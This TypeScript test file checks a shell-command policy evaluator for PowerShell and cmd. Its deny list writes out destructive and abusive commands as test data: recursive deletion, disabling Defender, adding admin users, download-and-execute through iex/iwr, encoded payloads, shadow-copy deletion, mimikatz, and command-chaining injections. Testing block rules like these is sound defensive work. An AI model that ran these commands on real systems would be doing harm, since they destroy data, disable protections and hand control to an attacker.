import test from "node:test";
import assert from "node:assert/strict";
import { evaluate } from "../src/policy.js";

const deny = (cmd: string, shell: "powershell" | "cmd" = "powershell") =>
  assert.equal(evaluate(shell, cmd, "standard").allowed, false, `should block: ${cmd}`);
const allow = (cmd: string, shell: "powershell" | "cmd" = "powershell") =>
  assert.equal(evaluate(shell, cmd, "standard").allowed, true, `should allow: ${cmd}`);

test("standard mode blocks destructive/abusive commands", () => {
  [
    "Remove-Item C:\\data -Recurse -Force", "rd /s /q C:\\x", "Format-Volume -DriveLetter D",
    "reg delete HKLM\\Software\\X /f", "Set-ExecutionPolicy Unrestricted", "shutdown /s /t 0",
    "Stop-Computer", "Set-MpPreference -DisableRealtimeMonitoring $true", "Start-Process cmd -Verb RunAs",
    "net user hacker pass /add", "iex (iwr http://x/y.ps1)", "Invoke-Expression $x",
    "powershell -enc AAAA", "[Convert]::FromBase64String('x')", "vssadmin delete shadows /all", "mimikatz",
  ].forEach((c) => deny(c));
  ["rmdir /s /q C:\\x", "del /s /q *.tmp", "net localgroup administrators x /add"].forEach((c) => deny(c, "cmd"));
});

test("standard mode allows ordinary administration", () => {
  [
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5", "Get-ChildItem C:\\Users | Format-Table",
    "Get-Service | Where-Object Status -eq Running", "Remove-Item C:\\tmp\\one.txt", "Get-Content app.log -Tail 50",
    "ipconfig /all", "Test-NetConnection example.com -Port 443", "Get-Item HKLM:\\Software",
  ].forEach((c) => allow(c));
  allow("dir C:\\", "cmd");
});

test("read_only mode is allowlist based", () => {
  assert.ok(evaluate("powershell", "Get-Process | Select-Object -First 3", "read_only").allowed);
  assert.ok(evaluate("cmd", "ipconfig /all", "read_only").allowed);
  assert.ok(!evaluate("powershell", "Remove-Item x", "read_only").allowed);
  assert.ok(!evaluate("powershell", "Get-Process > out.txt", "read_only").allowed);
  assert.ok(!evaluate("powershell", "Get-Process; del x", "read_only").allowed);
  assert.ok(!evaluate("powershell", "Get-Date $(calc)", "read_only").allowed);
});

test("unrestricted mode allows anything but empty", () => {
  assert.ok(evaluate("powershell", "Remove-Item x -Recurse", "unrestricted").allowed);
  assert.ok(!evaluate("powershell", "  ", "unrestricted").allowed);
});
